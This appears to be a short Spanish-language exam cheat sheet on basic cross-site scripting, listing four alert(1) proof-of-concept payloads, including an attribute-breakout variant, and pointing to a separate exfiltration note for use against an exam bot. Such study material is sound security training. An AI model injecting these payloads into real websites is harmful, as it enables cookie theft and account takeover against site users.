# XSS básico

> Prueba de concepto. Para el examen cambiá `alert(1)` por `print()` (el bot lo ejecuta) o por la exfil de [[exfil-oastify]].

```html
<img src=1 onerror=alert(1)>
```

```html
<script>alert(1)</script>
```

```html
<svg onload=alert(1)>
```

Atributo (rompés comilla/tag antes): `"><img src=1 onerror=alert(1)>`

## 🔗 [[exfil-oastify]] · [[../../vulnerabilities/002-xss/README|XSS]]
